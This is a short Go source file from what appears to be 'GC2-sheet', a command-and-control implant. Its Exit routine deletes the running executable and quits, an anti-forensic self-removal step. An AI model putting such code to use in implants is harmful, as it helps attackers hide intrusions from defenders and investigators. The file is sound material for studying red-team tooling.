//go:build !windows

package C2

import (
	"GC2-sheet/internal/utils"
	"os"
)

func Exit() {

	path, err := os.Executable()

	if err != nil {
		utils.LogDebug("Failed to retrieve the executable path " + err.Error())
	} else {
		utils.LogDebug("Executable path: " + path)
	}

	err = os.Remove(path)
	if err != nil {
		utils.LogDebug("Cannot self remove " + err.Error())
	}
	os.Exit(0)

}
